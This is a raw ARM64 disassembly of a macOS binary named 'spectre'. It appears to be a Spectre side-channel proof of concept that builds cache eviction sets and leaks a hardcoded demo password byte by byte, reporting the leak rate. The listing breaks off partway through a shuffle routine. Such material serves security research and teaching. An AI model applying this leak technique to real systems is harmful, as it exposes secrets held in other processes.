spectre:
(__TEXT,__text) section
_main:
00000001000022fc	sub	sp, sp, #0x80
0000000100002300	stp	x24, x23, [sp, #0x40]
0000000100002304	stp	x22, x21, [sp, #0x50]
0000000100002308	stp	x20, x19, [sp, #0x60]
000000010000230c	stp	x29, x30, [sp, #0x70]
0000000100002310	add	x29, sp, #0x70
0000000100002314	bl	_timer_start
0000000100002318	mov	w8, #0x1
000000010000231c	str	x8, [sp]
0000000100002320	adr	x0, #0x1a40 ; literal pool for: "[Spectre Variant %d]\n"
0000000100002324	nop
0000000100002328	bl	0x100003ccc ; symbol stub for: _printf
000000010000232c	mov	w0, #0x19
0000000100002330	bl	0x100003ca8 ; symbol stub for: _malloc
0000000100002334	mov	x19, x0
0000000100002338	adr	x0, #0x1a5c ; literal pool for: " ---- SETUP ---- "
000000010000233c	nop
0000000100002340	bl	0x100003cfc ; symbol stub for: _puts
0000000100002344	nop
0000000100002348	ldr	x20, #0x1cc0 ; literal pool symbol address: ___stdoutp
000000010000234c	ldr	x0, [x20]
0000000100002350	bl	0x100003c6c ; symbol stub for: _fflush
0000000100002354	adr	x0, #0x1a22 ; literal pool for: "ABC"
0000000100002358	nop
000000010000235c	adr	x1, #0x1a1e ; literal pool for: "S3cret P4ssword, really!!"
0000000100002360	nop
0000000100002364	bl	_setup
0000000100002368	mov	w0, #0xa
000000010000236c	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002370	adr	x0, #0x1a36 ; literal pool for: " ---- LEAKING ----"
0000000100002374	nop
0000000100002378	bl	0x100003cfc ; symbol stub for: _puts
000000010000237c	ldr	x0, [x20]
0000000100002380	bl	0x100003c6c ; symbol stub for: _fflush
0000000100002384	add	x0, sp, #0x30
0000000100002388	mov	x1, #0x0
000000010000238c	bl	0x100003c90 ; symbol stub for: _gettimeofday
0000000100002390	mov	x20, #0x0
0000000100002394	cmp	x20, #0x19
0000000100002398	b.eq	0x1000023b4
000000010000239c	add	x0, x20, #0x4
00000001000023a0	bl	_leakByte
00000001000023a4	strb	w0, [x19, x20]
00000001000023a8	add	x20, x20, #0x1
00000001000023ac	cmp	x20, #0x19
00000001000023b0	b.ne	0x10000239c
00000001000023b4	add	x0, sp, #0x20
00000001000023b8	mov	x1, #0x0
00000001000023bc	bl	0x100003c90 ; symbol stub for: _gettimeofday
00000001000023c0	ldr	w20, [sp, #0x20]
00000001000023c4	ldr	w22, [sp, #0x28]
00000001000023c8	ldr	w21, [sp, #0x30]
00000001000023cc	ldr	w23, [sp, #0x38]
00000001000023d0	mov	w0, #0xa
00000001000023d4	bl	0x100003cf0 ; symbol stub for: _putchar
00000001000023d8	adr	x0, #0x19e1 ; literal pool for: " ---- RESULT ----"
00000001000023dc	nop
00000001000023e0	bl	0x100003cfc ; symbol stub for: _puts
00000001000023e4	ldrsb	w0, [x19]
00000001000023e8	bl	0x100003cf0 ; symbol stub for: _putchar
00000001000023ec	ldrsb	w0, [x19, #0x1]
00000001000023f0	bl	0x100003cf0 ; symbol stub for: _putchar
00000001000023f4	ldrsb	w0, [x19, #0x2]
00000001000023f8	bl	0x100003cf0 ; symbol stub for: _putchar
00000001000023fc	ldrsb	w0, [x19, #0x3]
0000000100002400	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002404	ldrsb	w0, [x19, #0x4]
0000000100002408	bl	0x100003cf0 ; symbol stub for: _putchar
000000010000240c	ldrsb	w0, [x19, #0x5]
0000000100002410	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002414	ldrsb	w0, [x19, #0x6]
0000000100002418	bl	0x100003cf0 ; symbol stub for: _putchar
000000010000241c	ldrsb	w0, [x19, #0x7]
0000000100002420	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002424	ldrsb	w0, [x19, #0x8]
0000000100002428	bl	0x100003cf0 ; symbol stub for: _putchar
000000010000242c	ldrsb	w0, [x19, #0x9]
0000000100002430	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002434	ldrsb	w0, [x19, #0xa]
0000000100002438	bl	0x100003cf0 ; symbol stub for: _putchar
000000010000243c	ldrsb	w0, [x19, #0xb]
0000000100002440	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002444	ldrsb	w0, [x19, #0xc]
0000000100002448	bl	0x100003cf0 ; symbol stub for: _putchar
000000010000244c	ldrsb	w0, [x19, #0xd]
0000000100002450	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002454	ldrsb	w0, [x19, #0xe]
0000000100002458	bl	0x100003cf0 ; symbol stub for: _putchar
000000010000245c	ldrsb	w0, [x19, #0xf]
0000000100002460	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002464	ldrsb	w0, [x19, #0x10]
0000000100002468	bl	0x100003cf0 ; symbol stub for: _putchar
000000010000246c	ldrsb	w0, [x19, #0x11]
0000000100002470	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002474	ldrsb	w0, [x19, #0x12]
0000000100002478	bl	0x100003cf0 ; symbol stub for: _putchar
000000010000247c	ldrsb	w0, [x19, #0x13]
0000000100002480	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002484	ldrsb	w0, [x19, #0x14]
0000000100002488	bl	0x100003cf0 ; symbol stub for: _putchar
000000010000248c	ldrsb	w0, [x19, #0x15]
0000000100002490	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002494	ldrsb	w0, [x19, #0x16]
0000000100002498	bl	0x100003cf0 ; symbol stub for: _putchar
000000010000249c	ldrsb	w0, [x19, #0x17]
00000001000024a0	bl	0x100003cf0 ; symbol stub for: _putchar
00000001000024a4	ldrsb	w0, [x19, #0x18]
00000001000024a8	bl	0x100003cf0 ; symbol stub for: _putchar
00000001000024ac	sub	w8, w22, w23
00000001000024b0	mov	w9, #0x4dd3
00000001000024b4	movk	w9, #0x1062, lsl #16
00000001000024b8	smull	x8, w8, w9
00000001000024bc	lsr	x9, x8, #63
00000001000024c0	asr	x8, x8, #38
00000001000024c4	add	w8, w8, w9
00000001000024c8	sub	w9, w20, w21
00000001000024cc	mov	w10, #0x3e8
00000001000024d0	madd	w19, w9, w10, w8
00000001000024d4	mov	w0, #0xa
00000001000024d8	bl	0x100003cf0 ; symbol stub for: _putchar
00000001000024dc	scvtf	d0, w19
00000001000024e0	fmov	d1, #25.00000000
00000001000024e4	fdiv	d0, d1, d0
00000001000024e8	mov	x8, #0x400000000000
00000001000024ec	movk	x8, #0x408f, lsl #48
00000001000024f0	fmov	d1, x8
00000001000024f4	fmul	d0, d0, d1
00000001000024f8	str	d0, [sp, #0x10]
00000001000024fc	mov	w8, #0x19
0000000100002500	stp	x8, x19, [sp]
0000000100002504	adr	x0, #0x18c7 ; literal pool for: "leaked %d bytes in %dms. (%.2f bytes / sec)"
0000000100002508	nop
000000010000250c	bl	0x100003ccc ; symbol stub for: _printf
0000000100002510	mov	w0, #0xa
0000000100002514	bl	0x100003cf0 ; symbol stub for: _putchar
0000000100002518	bl	_timer_stop
000000010000251c	mov	w0, #0x0
0000000100002520	ldp	x29, x30, [sp, #0x70]
0000000100002524	ldp	x20, x19, [sp, #0x60]
0000000100002528	ldp	x22, x21, [sp, #0x50]
000000010000252c	ldp	x24, x23, [sp, #0x40]
0000000100002530	add	sp, sp, #0x80
0000000100002534	ret
_evset_init:
0000000100002538	stp	x20, x19, [sp, #-0x20]!
000000010000253c	stp	x29, x30, [sp, #0x10]
0000000100002540	add	x29, sp, #0x10
0000000100002544	mov	x0, #0x0
0000000100002548	bl	0x100003d44 ; symbol stub for: _time
000000010000254c	bl	0x100003d20 ; symbol stub for: _srand
0000000100002550	bl	_timer_start
0000000100002554	adrp	x8, 6 ; 0x100008000
0000000100002558	ldr	x9, [x8, #0x30]
000000010000255c	cbnz	x9, 0x10000256c
0000000100002560	adr	x9, #0xbd0
0000000100002564	nop
0000000100002568	str	x9, [x8, #0x30]
000000010000256c	adrp	x8, 6 ; 0x100008000
0000000100002570	ldrb	w9, [x8, #0x18]
0000000100002574	tbnz	w9, #0x0, 0x100002580
0000000100002578	mov	w9, #0x1
000000010000257c	strb	w9, [x8, #0x18]
0000000100002580	adrp	x8, 6 ; 0x100008000
0000000100002584	ldrb	w9, [x8, #0x20]
0000000100002588	tbnz	w9, #0x0, 0x100002594
000000010000258c	mov	w9, #0x1
0000000100002590	strb	w9, [x8, #0x20]
0000000100002594	adrp	x8, 6 ; 0x100008000
0000000100002598	ldrb	w9, [x8, #0x28]
000000010000259c	tbnz	w9, #0x0, 0x1000025a8
00000001000025a0	mov	w9, #0x1
00000001000025a4	strb	w9, [x8, #0x28]
00000001000025a8	adrp	x8, 6 ; 0x100008000
00000001000025ac	ldrb	w9, [x8]
00000001000025b0	tbnz	w9, #0x0, 0x1000025bc
00000001000025b4	mov	w9, #0x1
00000001000025b8	strb	w9, [x8]
00000001000025bc	adrp	x19, 6 ; 0x100008000
00000001000025c0	ldr	x8, [x19, #0x8]
00000001000025c4	cbnz	x8, 0x1000025d8
00000001000025c8	mov	w0, #0x1
00000001000025cc	mov	w1, #0x8
00000001000025d0	bl	0x100003c60 ; symbol stub for: _calloc
00000001000025d4	str	x0, [x19, #0x8]
00000001000025d8	adrp	x19, 6 ; 0x100008000
00000001000025dc	ldr	x8, [x19, #0x10]
00000001000025e0	cbnz	x8, 0x1000025f4
00000001000025e4	mov	w0, #0x1
00000001000025e8	mov	w1, #0x8
00000001000025ec	bl	0x100003c60 ; symbol stub for: _calloc
00000001000025f0	str	x0, [x19, #0x10]
00000001000025f4	ldp	x29, x30, [sp, #0x10]
00000001000025f8	ldp	x20, x19, [sp], #0x20
00000001000025fc	b	_timer_stop
_evset_find:
0000000100002600	sub	sp, sp, #0x70
0000000100002604	stp	x28, x27, [sp, #0x10]
0000000100002608	stp	x26, x25, [sp, #0x20]
000000010000260c	stp	x24, x23, [sp, #0x30]
0000000100002610	stp	x22, x21, [sp, #0x40]
0000000100002614	stp	x20, x19, [sp, #0x50]
0000000100002618	stp	x29, x30, [sp, #0x60]
000000010000261c	add	x29, sp, #0x60
0000000100002620	mov	x20, x0
0000000100002624	mov	x8, #0x0
0000000100002628	and	x19, x0, #0x3fc0
000000010000262c	lsr	x24, x0, #14
0000000100002630	adrp	x26, 6 ; 0x100008000
0000000100002634	ldr	w10, [x26, #0x1c]
0000000100002638	adrp	x25, 6 ; 0x100008000
000000010000263c	ldr	x9, [x25, #0x10]
0000000100002640	cmp	w10, #0x1
0000000100002644	csinc	w10, w10, wzr, gt
0000000100002648	sub	w10, w10, #0x1
000000010000264c	cmp	x10, x8
0000000100002650	b.eq	0x10000266c
0000000100002654	ldr	x11, [x9, x8, lsl #3]
0000000100002658	cmp	x11, x24
000000010000265c	b.eq	0x100002770
0000000100002660	add	x8, x8, #0x1
0000000100002664	cmp	x10, x8
0000000100002668	b.ne	0x100002654
000000010000266c	adrp	x27, 6 ; 0x100008000
0000000100002670	ldrb	w8, [x27, #0x28]
0000000100002674	cmp	w8, #0x0
0000000100002678	mov	w8, #0x1400000
000000010000267c	csel	x1, x8, xzr, ne
0000000100002680	mov	x0, #0x0
0000000100002684	mov	w2, #0x3
0000000100002688	mov	w3, #0x1002
000000010000268c	mov	w4, #0x0
0000000100002690	mov	x5, #0x0
0000000100002694	bl	0x100003cb4 ; symbol stub for: _mmap
0000000100002698	mov	x21, x0
000000010000269c	cbnz	x0, 0x1000026ac
00000001000026a0	adr	x0, #0x1812 ; literal pool for: "MMAP FAILED"
00000001000026a4	nop
00000001000026a8	bl	0x100003cfc ; symbol stub for: _puts
00000001000026ac	add	x8, x21, x19
00000001000026b0	str	x8, [sp, #0x8]
00000001000026b4	ldrb	w8, [x27, #0x28]
00000001000026b8	cmp	w8, #0x0
00000001000026bc	mov	w28, #0x1400000
00000001000026c0	csel	x1, x28, xzr, ne
00000001000026c4	mov	x0, x21
00000001000026c8	mov	x2, x19
00000001000026cc	bl	_initialize_list
00000001000026d0	mov	w25, #0x0
00000001000026d4	str	xzr, [sp]
00000001000026d8	adr	x23, #0x1809 ; literal pool for: "finding eviction set failed!"
00000001000026dc	nop
00000001000026e0	adr	x22, #0x181e ; literal pool for: "max retries exceeded!"
00000001000026e4	nop
00000001000026e8	add	x0, sp, #0x8
00000001000026ec	mov	x1, sp
00000001000026f0	mov	x2, x20
00000001000026f4	bl	_gt_eviction
00000001000026f8	cbz	w0, 0x10000278c
00000001000026fc	mov	x0, x23
0000000100002700	bl	0x100003cfc ; symbol stub for: _puts
0000000100002704	cmp	w25, #0x15
0000000100002708	b.eq	0x1000027a4
000000010000270c	ldrb	w8, [x27, #0x28]
0000000100002710	cmp	w8, #0x0
0000000100002714	csel	x1, x28, xzr, ne
0000000100002718	mov	x0, x21
000000010000271c	bl	0x100003cc0 ; symbol stub for: _munmap
0000000100002720	ldrb	w8, [x27, #0x28]
0000000100002724	cmp	w8, #0x0
0000000100002728	csel	x1, x28, xzr, ne
000000010000272c	mov	x0, #0x0
0000000100002730	mov	w2, #0x3
0000000100002734	mov	w3, #0x1002
0000000100002738	mov	w4, #0x0
000000010000273c	mov	x5, #0x0
0000000100002740	bl	0x100003cb4 ; symbol stub for: _mmap
0000000100002744	mov	x21, x0
0000000100002748	add	x8, x0, x19
000000010000274c	str	x8, [sp, #0x8]
0000000100002750	ldrb	w8, [x27, #0x28]
0000000100002754	cmp	w8, #0x0
0000000100002758	csel	x1, x28, xzr, ne
000000010000275c	mov	x2, x19
0000000100002760	bl	_initialize_list
0000000100002764	str	xzr, [sp]
0000000100002768	add	w25, w25, #0x1
000000010000276c	b	0x1000026e8
0000000100002770	nop
0000000100002774	ldr	x9, #0x5894
0000000100002778	sbfiz	x8, x8, #3, #32
000000010000277c	ldr	x0, [x9, x8]
0000000100002780	mov	x1, x19
0000000100002784	bl	_initialize_list_with_offset
0000000100002788	b	0x100002808
000000010000278c	cmp	w25, #0x13
0000000100002790	adrp	x25, 6 ; 0x100008000
0000000100002794	b.hi	0x1000027b0
0000000100002798	adr	x22, #0x1735 ; literal pool for: "Eviction set found!"
000000010000279c	nop
00000001000027a0	b	0x1000027a8
00000001000027a4	adrp	x25, 6 ; 0x100008000
00000001000027a8	mov	x0, x22
00000001000027ac	bl	0x100003cfc ; symbol stub for: _puts
00000001000027b0	ldr	x8, [sp]
00000001000027b4	adrp	x20, 6 ; 0x100008000
00000001000027b8	mov	x21, #-0x4000
00000001000027bc	mov	w22, #0x4000
00000001000027c0	adr	x19, #0x16fe ; literal pool for: "munmap failed!"
00000001000027c4	nop
00000001000027c8	b	0x1000027d4
00000001000027cc	str	x23, [sp]
00000001000027d0	mov	x8, x23
00000001000027d4	cbz	x8, 0x100002804
00000001000027d8	ldr	x23, [x8]
00000001000027dc	ldrb	w9, [x20, #0x20]
00000001000027e0	cmp	w9, #0x0
00000001000027e4	csel	x9, x21, xzr, ne
00000001000027e8	csel	x1, x22, xzr, ne
00000001000027ec	and	x0, x9, x8
00000001000027f0	bl	0x100003cc0 ; symbol stub for: _munmap
00000001000027f4	cbz	w0, 0x1000027cc
00000001000027f8	mov	x0, x19
00000001000027fc	bl	0x100003cfc ; symbol stub for: _puts
0000000100002800	b	0x1000027cc
0000000100002804	ldr	x0, [sp, #0x8]
0000000100002808	nop
000000010000280c	ldr	x8, #0x57fc
0000000100002810	ldrsw	x9, [x26, #0x1c]
0000000100002814	lsl	x9, x9, #3
0000000100002818	sub	x9, x9, #0x8
000000010000281c	str	x0, [x8, x9]
0000000100002820	ldr	x8, [x25, #0x10]
0000000100002824	str	x24, [x8, x9]
0000000100002828	ldp	x29, x30, [sp, #0x60]
000000010000282c	ldp	x20, x19, [sp, #0x50]
0000000100002830	ldp	x22, x21, [sp, #0x40]
0000000100002834	ldp	x24, x23, [sp, #0x30]
0000000100002838	ldp	x26, x25, [sp, #0x20]
000000010000283c	ldp	x28, x27, [sp, #0x10]
0000000100002840	add	sp, sp, #0x70
0000000100002844	ret
_initialize_list_with_offset:
0000000100002848	mov	x8, #0x0
000000010000284c	adrp	x9, 6 ; 0x100008000
0000000100002850	ldrb	w9, [x9, #0x20]
0000000100002854	cmp	w9, #0x0
0000000100002858	mov	w9, #0x3fff
000000010000285c	csinv	x9, x9, xzr, ne
0000000100002860	and	x9, x9, x0
0000000100002864	eor	x9, x9, x1
0000000100002868	mov	w10, #-0x2
000000010000286c	mov	x11, x0
0000000100002870	b	0x10000287c
0000000100002874	ldr	x11, [x11]
0000000100002878	mov	x8, x12
000000010000287c	cbz	x11, 0x10000289c
0000000100002880	eor	x12, x9, x11
0000000100002884	str	w10, [x12, #0x10]
0000000100002888	str	xzr, [x12, #0x18]
000000010000288c	stp	xzr, x8, [x12]
0000000100002890	cbz	x8, 0x100002874
0000000100002894	str	x12, [x8]
0000000100002898	b	0x100002874
000000010000289c	eor	x0, x9, x0
00000001000028a0	ret
_initialize_list:
00000001000028a4	mov	x9, #0x0
00000001000028a8	sub	x8, x1, #0x40
00000001000028ac	adrp	x10, 6 ; 0x100008000
00000001000028b0	ldrb	w10, [x10, #0x20]
00000001000028b4	cmp	w10, #0x0
00000001000028b8	mov	w10, #0x4000
00000001000028bc	csel	x10, x10, xzr, ne
00000001000028c0	mov	w11, #-0x2
00000001000028c4	b	0x1000028d0
00000001000028c8	add	x2, x2, x10
00000001000028cc	mov	x9, x12
00000001000028d0	cmp	x2, x8
00000001000028d4	b.hs	0x1000028f4
00000001000028d8	add	x12, x0, x2
00000001000028dc	str	w11, [x12, #0x10]
00000001000028e0	str	xzr, [x12, #0x18]
00000001000028e4	stp	xzr, x9, [x12]
00000001000028e8	cbz	x9, 0x1000028c8
00000001000028ec	str	x12, [x9]
00000001000028f0	b	0x1000028c8
00000001000028f4	ret
_gt_eviction:
00000001000028f8	sub	sp, sp, #0xd0
00000001000028fc	stp	d11, d10, [sp, #0x50]
0000000100002900	stp	d9, d8, [sp, #0x60]
0000000100002904	stp	x28, x27, [sp, #0x70]
0000000100002908	stp	x26, x25, [sp, #0x80]
000000010000290c	stp	x24, x23, [sp, #0x90]
0000000100002910	stp	x22, x21, [sp, #0xa0]
0000000100002914	stp	x20, x19, [sp, #0xb0]
0000000100002918	stp	x29, x30, [sp, #0xc0]
000000010000291c	add	x29, sp, #0xc0
0000000100002920	mov	x19, x2
0000000100002924	mov	x28, x1
0000000100002928	mov	x21, x0
000000010000292c	adrp	x27, 6 ; 0x100008000
0000000100002930	ldrb	w23, [x27, #0x18]
0000000100002934	cmp	w23, #0x0
0000000100002938	mov	w8, #0x21
000000010000293c	csinc	x22, x8, xzr, ne
0000000100002940	mov	x0, x22
0000000100002944	mov	w1, #0x8
0000000100002948	bl	0x100003c60 ; symbol stub for: _calloc
000000010000294c	cbz	x0, 0x100002c34
0000000100002950	mov	x20, x0
0000000100002954	mov	x0, x22
0000000100002958	mov	w1, #0x4
000000010000295c	bl	0x100003c60 ; symbol stub for: _calloc
0000000100002960	cbz	x0, 0x100002c44
0000000100002964	mov	x22, x0
0000000100002968	ldr	x26, [x21]
000000010000296c	mov	x0, x26
0000000100002970	bl	_list_length
0000000100002974	mov	w8, #0x20
0000000100002978	cmp	w23, #0x0
000000010000297c	csel	w8, w8, wzr, ne
0000000100002980	scvtf	d0, w8
0000000100002984	mov	x25, x0
0000000100002988	scvtf	d1, w0
000000010000298c	fdiv	d8, d0, d1
0000000100002990	orr	w8, w8, #0x1
0000000100002994	scvtf	d1, w8
0000000100002998	fdiv	d9, d0, d1
000000010000299c	fmov	d0, d8
00000001000029a0	bl	0x100003c9c ; symbol stub for: _log
00000001000029a4	fmov	d10, d0
00000001000029a8	fmov	d0, d9
00000001000029ac	bl	0x100003c9c ; symbol stub for: _log
00000001000029b0	fdiv	d0, d10, d0
00000001000029b4	fcvtps	w24, d0
00000001000029b8	lsl	w8, w24, #1
00000001000029bc	str	x8, [sp, #0x28]
00000001000029c0	sxtw	x0, w8
00000001000029c4	mov	w1, #0x8
00000001000029c8	bl	0x100003c60 ; symbol stub for: _calloc
00000001000029cc	str	x0, [sp, #0x48]
00000001000029d0	cbz	x0, 0x100002c58
00000001000029d4	str	x28, [sp, #0x20]
00000001000029d8	mov	w26, #0x0
00000001000029dc	str	wzr, [sp, #0x44]
00000001000029e0	nop
00000001000029e4	ldr	q0, 0x100003d50
00000001000029e8	str	q0, [sp, #0x30]
00000001000029ec	tst	w23, #0x1
00000001000029f0	mov	w8, #0x20
00000001000029f4	csel	w9, w8, wzr, ne
00000001000029f8	orr	w8, w9, #0x2
00000001000029fc	cmp	w8, #0x5
0000000100002a00	b.hs	0x100002a0c
0000000100002a04	mov	x8, #0x0
0000000100002a08	b	0x100002a30
0000000100002a0c	sub	x8, x8, #0x2
0000000100002a10	mov	x10, x8
0000000100002a14	mov	x11, x22
0000000100002a18	ldr	q0, [sp, #0x30]
0000000100002a1c	movi.4s	v1, #0x4
0000000100002a20	str	q0, [x11], #0x10
0000000100002a24	add.4s	v0, v0, v1
0000000100002a28	subs	x10, x10, #0x4
0000000100002a2c	b.ne	0x100002a20
0000000100002a30	orr	w9, w9, #0x1
0000000100002a34	cmp	x9, x8
0000000100002a38	b.eq	0x100002a4c
0000000100002a3c	str	w8, [x22, x8, lsl #2]
0000000100002a40	add	x8, x8, #0x1
0000000100002a44	cmp	x9, x8
0000000100002a48	b.ne	0x100002a3c
0000000100002a4c	tst	w23, #0x1
0000000100002a50	mov	w8, #0x21
0000000100002a54	csinc	x1, x8, xzr, ne
0000000100002a58	mov	x0, x22
0000000100002a5c	bl	_shuffle
0000000100002a60	ldrb	w8, [x27, #0x18]
0000000100002a64	sxtw	x28, w26
0000000100002a68	tst	w8, #0x1
0000000100002a6c	mov	w9, #0x20
0000000100002a70	csel	w9, w9, wzr, ne
0000000100002a74	cmp	w25, w9
0000000100002a78	b.le	0x100002bbc
0000000100002a7c	ldr	x0, [x21]
0000000100002a80	tst	w8, #0x1
0000000100002a84	mov	w23, #0x21
0000000100002a88	csinc	w2, w23, wzr, ne
0000000100002a8c	mov	x1, x20
0000000100002a90	bl	_list_split
0000000100002a94	ldrb	w8, [x27, #0x18]
0000000100002a98	ldr	w26, [x22]
0000000100002a9c	cmp	w8, #0x0
0000000100002aa0	csinc	w3, w23, wzr, ne
0000000100002aa4	mov	x0, x21
0000000100002aa8	mov	x1, x20
0000000100002aac	mov	x2, x26
0000000100002ab0	bl	_list_from_chunks
0000000100002ab4	ldr	x0, [x21]
0000000100002ab8	mov	x1, x19
0000000100002abc	bl	_tests_avg
0000000100002ac0	cbz	w0, 0x100002b04
0000000100002ac4	mov	x24, #0x0
0000000100002ac8	ldrb	w23, [x27, #0x18]
0000000100002acc	and	x8, x24, #0xffffffe0
0000000100002ad0	cmp	w23, #0x1
0000000100002ad4	ccmp	x8, #0x0, #0x0, eq
0000000100002ad8	b.ne	0x100002b58
0000000100002adc	ldr	x0, [x20, w26, sxtw #3]
0000000100002ae0	ldr	x8, [sp, #0x48]
0000000100002ae4	str	x0, [x8, x28, lsl #3]
0000000100002ae8	bl	_list_length
0000000100002aec	ldr	x0, [x21]
0000000100002af0	bl	_list_length
0000000100002af4	mov	x25, x0
0000000100002af8	add	x28, x28, #0x1
0000000100002afc	mov	w8, #0x1
0000000100002b00	b	0x100002a68
0000000100002b04	ldrb	w23, [x27, #0x18]
0000000100002b08	cmp	w23, #0x1
0000000100002b0c	b.ne	0x100002b58
0000000100002b10	mov	w24, #0x1
0000000100002b14	ldr	w26, [x22, x24, lsl #2]
0000000100002b18	mov	x0, x21
0000000100002b1c	mov	x1, x20
0000000100002b20	mov	x2, x26
0000000100002b24	mov	w3, #0x21
0000000100002b28	bl	_list_from_chunks
0000000100002b2c	ldr	x0, [x21]
0000000100002b30	mov	x1, x19
0000000100002b34	bl	_tests_avg
0000000100002b38	cbnz	w0, 0x100002ac8
0000000100002b3c	ldrb	w23, [x27, #0x18]
0000000100002b40	cmp	w23, #0x1
0000000100002b44	b.ne	0x100002b58
0000000100002b48	add	x8, x24, #0x1
0000000100002b4c	cmp	x24, #0x20
0000000100002b50	mov	x24, x8
0000000100002b54	b.lo	0x100002b14
0000000100002b58	ldr	x1, [x20, w26, sxtw #3]
0000000100002b5c	mov	x0, x21
0000000100002b60	bl	_list_concat
0000000100002b64	cmp	w28, #0x0
0000000100002b68	b.le	0x100002bbc
0000000100002b6c	subs	w8, w28, #0x1
0000000100002b70	sbfiz	x26, x8, #3, #32
0000000100002b74	ldr	x25, [sp, #0x48]
0000000100002b78	ldr	x24, [x25, x26]
0000000100002b7c	mov	x0, x24
0000000100002b80	bl	_list_length
0000000100002b84	mov	x0, x21
0000000100002b88	mov	x1, x24
0000000100002b8c	bl	_list_concat
0000000100002b90	str	xzr, [x25, x26]
0000000100002b94	ldr	x0, [x21]
0000000100002b98	bl	_list_length
0000000100002b9c	mov	x25, x0
0000000100002ba0	subs	w26, w28, #0x1
0000000100002ba4	b.eq	0x100002bbc
0000000100002ba8	ldr	w8, [sp, #0x44]
0000000100002bac	add	w8, w8, #0x1
0000000100002bb0	str	w8, [sp, #0x44]
0000000100002bb4	cmp	w8, #0x33
0000000100002bb8	b.ne	0x1000029ec
0000000100002bbc	mov	x23, #0x0
0000000100002bc0	ldp	x26, x8, [sp, #0x20]
0000000100002bc4	bic	w8, w8, w8, asr #31
0000000100002bc8	ubfiz	x24, x8, #3, #32
0000000100002bcc	ldr	x28, [sp, #0x48]
0000000100002bd0	cmp	x24, x23
0000000100002bd4	b.eq	0x100002bf0
0000000100002bd8	ldr	x1, [x28, x23]
0000000100002bdc	mov	x0, x26
0000000100002be0	bl	_list_concat
0000000100002be4	add	x23, x23, #0x8
0000000100002be8	cmp	x24, x23
0000000100002bec	b.ne	0x100002bd8
0000000100002bf0	mov	x0, x20
0000000100002bf4	bl	0x100003c84 ; symbol stub for: _free
0000000100002bf8	mov	x0, x22
0000000100002bfc	bl	0x100003c84 ; symbol stub for: _free
0000000100002c00	mov	x0, x28
0000000100002c04	bl	0x100003c84 ; symbol stub for: _free
0000000100002c08	ldr	x0, [x21]
0000000100002c0c	mov	x1, x19
0000000100002c10	bl	_tests_avg
0000000100002c14	cbz	w0, 0x100002c88
0000000100002c18	ldrb	w8, [x27, #0x18]
0000000100002c1c	mov	w9, #0x20
0000000100002c20	cmp	w8, #0x0
0000000100002c24	csel	w8, w9, wzr, ne
0000000100002c28	cmp	w25, w8
0000000100002c2c	cset	w0, gt
0000000100002c30	b	0x100002c8c
0000000100002c34	adr	x0, #0x12e0 ; literal pool for: "Could not allocate chunks!"
0000000100002c38	nop
0000000100002c3c	bl	0x100003cfc ; symbol stub for: _puts
0000000100002c40	b	0x100002c88
0000000100002c44	adr	x0, #0x12eb ; literal pool for: "Could not allocate ichunks!"
0000000100002c48	nop
0000000100002c4c	bl	0x100003cfc ; symbol stub for: _puts
0000000100002c50	mov	x0, x20
0000000100002c54	b	0x100002c84
0000000100002c58	mov	x0, x26
0000000100002c5c	bl	_list_length
0000000100002c60	str	x0, [sp, #0x18]
0000000100002c64	stp	d8, d9, [sp, #0x8]
0000000100002c68	str	x24, [sp]
0000000100002c6c	adr	x0, #0x118b ; literal pool for: "Could not allocate back (%d, %f, %f, %d)!\n"
0000000100002c70	nop
0000000100002c74	bl	0x100003ccc ; symbol stub for: _printf
0000000100002c78	mov	x0, x20
0000000100002c7c	bl	0x100003c84 ; symbol stub for: _free
0000000100002c80	mov	x0, x22
0000000100002c84	bl	0x100003c84 ; symbol stub for: _free
0000000100002c88	mov	w0, #0x1
0000000100002c8c	ldp	x29, x30, [sp, #0xc0]
0000000100002c90	ldp	x20, x19, [sp, #0xb0]
0000000100002c94	ldp	x22, x21, [sp, #0xa0]
0000000100002c98	ldp	x24, x23, [sp, #0x90]
0000000100002c9c	ldp	x26, x25, [sp, #0x80]
0000000100002ca0	ldp	x28, x27, [sp, #0x70]
0000000100002ca4	ldp	d9, d8, [sp, #0x60]
0000000100002ca8	ldp	d11, d10, [sp, #0x50]
0000000100002cac	add	sp, sp, #0xd0
0000000100002cb0	ret
_list_length:
0000000100002cb4	mov	w8, #0x0
0000000100002cb8	cbz	x0, 0x100002cc8
0000000100002cbc	add	w8, w8, #0x1
0000000100002cc0	ldr	x0, [x0]
0000000100002cc4	cbnz	x0, 0x100002cbc
0000000100002cc8	mov	x0, x8
0000000100002ccc	ret
_shuffle:
0000000100002cd0	cmp	x1, #0x2
0000000100002cd4	b.lo	0x100002d54
0000000100002cd8	stp	x24, x23, [sp, #-0x40]!
0000000100002cdc	stp	x22, x21, [sp, #0x10]
0000000100002ce0	stp	x20, x19, [sp, #0x20]
0000000100002ce4	stp	x29, x30, [sp, #0x30]
0000000100002ce8	add	x29, sp, #0x30
0000000100002cec	mov	x20, x1
0000000100002cf0	mov	x19, x0
0000000100002cf4	mov	x21, #0x0
0000000100002cf8	mov	w22, #0x7fffffff
0000000100002cfc	subs	x23, x20, #0x1
0000000100002d00	b.eq	0x100002d44
0000000100002d04	bl	0x100003d08 ; symbol stub for: _rand
0000000100002d08	sxtw	x8, w0
0000000100002d0c	udiv	x9, x22, x20
0000000100002d10	add	x9, x9, #0x1
0000000100002d14	udiv	x8, x8, x9
0000000100002d18	add	x8, x21, x8
0000000100002d1c	lsl	x8, x8, #2
0000000100002d20	ldr	w9, [x19, x8]
0000000100002d24	lsl	x10, x21, #2
0000000100002d28	ldr	w11, [x19, x10]
0000000100002d2c	str	w11, [x19, x8]
0000000100002d30	str	w9, [x19, x10]
0000000100002d34	add	x21, x21, #0x1
0000000100002d38	mov	x20, x23
0000000100002d3c	subs	x23, x20, #0x1
0000000100002d40	b.ne	0x100002d04
0000000100002d44	ldp	x29, x30, [sp, #0x30]
0000000100002d48	ldp	x20, x19, [sp, #0x20]
0000000100002d4c	ldp	x22, x21, [sp, #0x10]
